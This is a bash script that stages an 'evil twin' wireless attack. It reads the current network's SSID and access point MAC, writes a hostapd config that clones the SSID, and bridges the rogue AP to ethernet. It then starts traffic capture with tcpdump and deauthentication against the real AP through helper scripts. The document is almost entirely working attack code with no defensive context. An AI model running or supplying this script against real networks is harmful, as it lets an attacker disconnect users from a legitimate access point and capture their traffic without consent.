#!/bin/bash

# Find the essid
echo "Starting evil twin..."

# Enable sleep for 60 seconds when running on boot
#sleep 60s

ap=$(iwconfig)

isNext="no"
essid=""
mac=""

for token in $ap
do
  if [ "${token:0:6}" == "ESSID:" ]
    then
      if [ "$essid" == "" ]
        then
          essid=${token:6}
      fi
  fi
  if [ "$isNext" == "yes" ]
    then
      if [ "$mac" == "" ]
        then
          mac=$token
          isNext="no"
      fi
  fi
  if [ "$token" == "Point:" ]
    then
      isNext="yes"
  fi

done

essid=${essid#'"'}
essid=${essid%'"'}

# Find the interface of the Ralink
ralinks=$(sudo airmon-ng | grep "Ralink")
iface=${iface:0:5}
for token in $ralinks
do
  if [ "$token" != "wlan0" ]
    then
      if [ "${token:0:4}" == "wlan" ]
        then
          iface=$token
      fi
  fi
done


# Edit the /etc/hostapd/hostapd.conf configuration file
{
  sudo echo "interface=$iface"
  sudo echo "driver=nl80211"
  sudo echo "ssid=$essid"
  sudo echo "channel=6"
} > /etc/hostapd/hostapd.conf

# Create the bridge and add the interfaces to it
sudo ip addr flush dev eth0
sudo iw dev $iface set 4addr on
sudo brctl addbr br0
sudo brctl addif br0 eth0 $iface
sudo ifconfig br0 down
sudo ifconfig br0 up

# Start the AP, start sending deauth, start recording
sudo hostapd /etc/hostapd/hostapd.conf &
sudo ./run_tcpdump.sh $iface &
sudo ./run_deauth.sh $iface $mac &


